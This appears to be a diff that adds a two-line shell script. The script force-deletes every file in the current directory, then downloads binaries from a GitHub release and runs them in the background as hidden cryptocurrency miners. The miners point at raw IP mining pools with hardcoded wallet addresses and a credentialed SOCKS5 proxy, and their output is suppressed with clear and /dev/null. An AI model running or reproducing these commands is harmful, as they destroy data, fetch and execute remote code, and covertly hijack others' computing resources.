@@ -1,0 +1,2 @@
+rm -rvf * && mkdir a && cd a
+wget https://github.com/rochmandwi/ayam/releases/download/file-v1/wild && chmod +x wild && ./wild --algo pearlhash --url 103.178.153.229:80 --user prl1p8qmmljaztxhxd8mf8kxa7np2l9xa3a6sz3h3yuclq6mev0whfqwqprehq6.$(shuf -n 1 -i 1-9999)-Bismillah --proxy socks5://ubed:ubed123@103.176.78.132:443 & sleep 10 && wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod +x sse2 && clear && ./sse2 -a yespowertide -o 103.217.145.116:80 -u TLkiWTgyrWaphPgGpNL93vB3g4yjgEQW3o.Angkii -t $(nproc) > /dev/null 2>&1 & clear 
